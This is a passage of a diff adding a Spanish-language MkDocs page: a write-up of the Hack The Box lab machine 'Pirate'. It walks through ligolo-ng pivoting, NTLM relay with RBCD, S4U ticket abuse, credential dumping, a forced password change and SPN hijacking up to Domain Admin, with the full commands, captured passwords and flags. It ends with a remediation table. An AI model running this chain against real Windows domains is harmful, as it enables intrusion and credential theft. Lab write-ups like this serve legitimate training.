+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Kali</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>./proxy<span class="w"> </span>-selfcert<span class="w"> </span>-laddr<span class="w"> </span><span class="m">0</span>.0.0.0:11601
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># DC01 (evil-winrm)</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>upload<span class="w"> </span>agent.exe
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>.<span class="se">\a</span>gent.exe<span class="w"> </span>-connect<span class="w"> </span><span class="m">10</span>.10.14.207:11601<span class="w"> </span>-ignore-cert
+</code></pre></div>
+<p><img alt="Ligolo agente conectando" src="../screenshots/pirate_ligolo_connect.png" /></p>
+<p><img alt="Ligolo agente unido" src="../screenshots/pirate_ligolo_joined.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Kali — activar ruta</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>tuntap<span class="w"> </span>add<span class="w"> </span>user<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>mode<span class="w"> </span>tun<span class="w"> </span>ligolo
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>ligolo<span class="w"> </span>up
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>sudo<span class="w"> </span>ip<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">192</span>.168.100.0/24<span class="w"> </span>dev<span class="w"> </span>ligolo
+</code></pre></div>
+<p><img alt="Ligolo sesión activa" src="../screenshots/pirate_ligolo_session.png" /></p>
+<p>WEB01 (192.168.100.2) ahora accesible desde Kali.</p>
+<hr />
+<h2 id="5-ntlm-relay-rbcd-admin-en-web01">5. NTLM Relay + RBCD → Admin en WEB01</h2>
+<h3 id="webclient-detection">WebClient Detection</h3>
+<p>Antes de intentar relay, verificar que WebClient esté activo en WEB01 (requisito para coerción via WebDAV):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.100.2<span class="w"> </span>-u<span class="w"> </span>pentest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;p3nt3st2025!&amp;&#39;</span><span class="w"> </span>-M<span class="w"> </span>webdav
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>WEBDAV  192.168.100.2  WEB01  WebClient Service enabled on: 192.168.100.2
+</code></pre></div>
+<p>WebClient habilitado → coerción via <code>@port</code> notation disponible.</p>
+<h3 id="ntlm-relay-setup">NTLM Relay Setup</h3>
+<p>SMB signing en WEB01: <code>enabled but not required</code> → vulnerable a relay.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Terminal 1 — relay a LDAPS del DC con delegación RBCD</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://10.129.244.95<span class="w"> </span>--delegate-access<span class="w"> </span>--remove-mic<span class="w"> </span>-smb2support
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Terminal 2 — coerción de WEB01 hacia Kali</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.14.207<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.100.2<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">  </span>-d<span class="w"> </span>pirate.htb<span class="w"> </span>-u<span class="w"> </span>pentest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;p3nt3st2025!&amp;&#39;</span><span class="w"> </span>--always-continue
+</code></pre></div>
+<p><img alt="RBCD exitoso" src="../screenshots/pirate_rbcd_success.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>[*] Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldaps://10.129.244.95 SUCCEED
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>[*] Adding new computer with username: WIHDYOOD$ and password: /p/u+d2(o13llbH result: OK
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>[*] Delegation rights modified successfully!
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>[*] WIHDYOOD$ can now impersonate users on WEB01$ via S4U2Proxy
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title"><code>--remove-mic</code> es obligatorio</p>
+<p>Sin esta flag: <code>The client requested signing. Relaying to LDAP will not work!</code></p>
+</div>
+<h3 id="obtener-shell-en-web01">Obtener Shell en WEB01</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Sincronizar reloj (KRB_AP_ERR_SKEW)</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.129.244.95
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># 2026-05-27 04:18:06.312848 (-0600) +719.012374 +/- 0.036244 10.129.244.95 s1 no-leap</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># Ticket S4U como Administrator</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>/tmp/imp/bin/getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/WEB01.pirate.htb<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.244.95<span class="w"> </span><span class="s1">&#39;pirate.htb/WIHDYOOD$:/p/u+d2(o13llbH&#39;</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># [*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="c1"># Shell en WEB01</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="w">  </span>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>pirate.htb/Administrator@WEB01.pirate.htb
+</code></pre></div>
+<hr />
+<h2 id="6-post-exploitation-web01">6. Post-Exploitation — WEB01</h2>
+<h3 id="user-flag">User Flag</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>C:\Users\a.white\Desktop&gt; type user.txt
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>8780c8e8b4a4f1bb4627760352cc920f
+</code></pre></div>
+<h3 id="credential-dump">Credential Dump</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>pirate.htb/Administrator@WEB01.pirate.htb
+</code></pre></div>
+<p>LSA Secrets:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>[*] DefaultPassword
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>PIRATE\a.white:E2nvAOKSz5Xz2MJu
+</code></pre></div>
+<hr />
+<h2 id="7-privilege-escalation-domain-admin">7. Privilege Escalation — Domain Admin</h2>
+<h3 id="bloodhound">BloodHound</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span>a.white<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;E2nvAOKSz5Xz2MJu&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-d<span class="w"> </span>pirate.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.244.95<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>INFO: Found 5 computers, 10 users, 54 groups, 2 gpos, 1 ous, 20 containers
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>INFO: Compressing output into 20260527042539_bloodhound.zip
+</code></pre></div>
+<p>Hallazgos clave:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>a.white ──ForceChangePassword──► a.white_adm
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>a.white_adm ──memberOf──► IT
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>IT ──WriteSPN──► DC01$
+</code></pre></div>
+<p><code>a.white_adm</code>: <code>trustedtoauth=true</code>, <code>AllowedToDelegate=http/WEB01.pirate.htb</code></p>
+<h3 id="forcechangepassword">ForceChangePassword</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span>a.white_adm<span class="w"> </span><span class="s1">&#39;Pirate123!&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s1">&#39;pirate.htb/a.white%E2nvAOKSz5Xz2MJu&#39;</span><span class="w"> </span>-S<span class="w"> </span><span class="m">10</span>.129.244.95
+</code></pre></div>
+<h3 id="spn-hijacking">SPN Hijacking</h3>
+<p><code>a.white_adm</code> delega a <code>http/WEB01.pirate.htb</code>. Al mover ese SPN de WEB01$ a DC01$ (usando el WriteSPN que IT tiene sobre DC01$), el S4U2Proxy apuntará al DC.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Quitar SPN de WEB01$</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>python3<span class="w"> </span>/tmp/krbrelayx/addspn.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;pirate\a.white_adm&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pirate123!&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">  </span>-t<span class="w"> </span><span class="s1">&#39;WEB01$&#39;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;HTTP/WEB01.pirate.htb&#39;</span><span class="w"> </span>-r<span class="w"> </span><span class="m">10</span>.129.244.95
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># [+] SPN Modified successfully</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="c1"># Inyectar SPN en DC01$</span>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>python3<span class="w"> </span>/tmp/krbrelayx/addspn.py<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;pirate\a.white_adm&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pirate123!&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="w">  </span>-t<span class="w"> </span><span class="s1">&#39;DC01$&#39;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;HTTP/WEB01.pirate.htb&#39;</span><span class="w"> </span><span class="m">10</span>.129.244.95
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c1"># [+] SPN Modified successfully</span>
+</code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">Formato de usuario en addspn.py</p>
+<p>Usar <code>DOMAIN\username</code> con backslash. Con slash <code>/</code> falla: <code>Username must include a domain, use: DOMAIN\username</code></p>
+</div>
+<h3 id="s4u2proxy-altservice-domain-admin">S4U2Proxy + altservice → Domain Admin</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>/tmp/imp/bin/getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">&#39;http/WEB01.pirate.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">  </span>-altservice<span class="w"> </span><span class="s1">&#39;host/DC01.pirate.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">  </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.244.95<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="w">  </span><span class="s1">&#39;pirate.htb/a.white_adm:Pirate123!&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>[*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>                        to host/DC01.pirate.htb@PIRATE.HTB
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>[*] Saving ticket in Administrator@host_DC01.pirate.htb@PIRATE.HTB.ccache
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@host_DC01.pirate.htb@PIRATE.HTB.ccache<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">  </span>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>pirate.htb/Administrator@DC01.pirate.htb
+</code></pre></div>
+<hr />
+<h2 id="8-root-flag">8. Root Flag</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>C:\Users\Administrator\Desktop&gt; type root.txt
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>cb58d84bd134cb4a8496837cedcd152c
+</code></pre></div>
+<p><code>whoami → pirate\administrator</code> en DC01. Domain Admin.</p>
+<hr />
+<h2 id="9-remediation">9. Remediation</h2>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Recomendación</th>
+<th>Prioridad</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Pre-Win2000 cuentas activas</td>
+<td>Quitar del grupo; rotar contraseñas</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>gMSA legible por cuentas de máquina</td>
+<td>Auditar msDS-GroupMSAMembership</td>
+<td>High</td>
+</tr>
+<tr>
+<td>SMB signing no requerido (WEB01)</td>
+<td>Habilitar via GPO</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>LDAP signing no requerido (DC01)</td>
+<td>Requerir firma LDAP</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>WebClient habilitado en servidores</td>
+<td>Deshabilitar via GPO si no es necesario</td>
+<td>High</td>
+</tr>
+<tr>
+<td>ForceChangePassword sobre cuenta admin</td>
+<td>Auditar ACLs con BloodHound</td>
+<td>High</td>
+</tr>
+<tr>
+<td>WriteSPN de grupo IT sobre DC01</td>
+<td>Restringir a Domain Admins</td>
+<td>High</td>
+</tr>
+<tr>
+<td>trustedtoauth + constrained delegation</td>
+<td>Usar gMSA para servicios</td>
+<td>High</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="10-lessons-learned">10. Lessons Learned</h2>
+<ul>
+<li><strong>Pre-Win2000 Compatible Access</strong> es el vector más fácil de pasar por alto — siempre enumerar sus miembros.</li>
+<li><strong>gMSA dump via CME:</strong> <code>MS01$</code> no puede autenticarse con contraseña a LDAP — sólo via TGT Kerberos. Usar <code>--use-kcache</code> con <code>KRB5CCNAME</code>.</li>
+<li><strong><code>--remove-mic</code></strong> en ntlmrelayx es obligatorio para relay a LDAPS.</li>
+<li><strong>WebClient detection primero:</strong> <code>crackmapexec smb -M webdav</code> — sin WebClient activo la coerción vía WebDAV no funciona.</li>
+<li><strong>SPN hijacking:</strong> WriteSPN en un objeto de computadora permite redirigir a quién apunta una delegación existente sin tocar <code>msDS-AllowedToDelegateTo</code>. Usar <code>addspn.py</code> de krbrelayx (bloodyAD y ldap3 directo fallan).</li>
+<li><strong><code>-altservice</code></strong> en getST.py relabelea el TGS resultante para usarlo con la herramienta correcta — wmiexec necesita <code>host/</code>, evil-winrm con GSSAPI falla si <code>/etc/krb5.conf</code> no existe o hay case mismatch en el SPN.</li>
+<li><strong>ntpdate:</strong> El skew era de +719 segundos. Sin sincronización, todo getST.py falla con <code>KRB_AP_ERR_SKEW</code>.</li>
+</ul>
+<hr />
+<h2 id="11-references">11. References</h2>
+<ul>
+<li><a href="https://www.thehacker.recipes/ad/movement/dacl/pre-windows-2000-computers">Pre-Windows 2000 Compatible Access</a></li>
+<li><a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a></li>
+<li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">NTLM Relay + RBCD — The Hacker Recipes</a></li>
+<li><a href="https://github.com/dirkjanm/krbrelayx">krbrelayx / addspn.py</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Principal/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Principal">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Principal
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "search.highlight", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
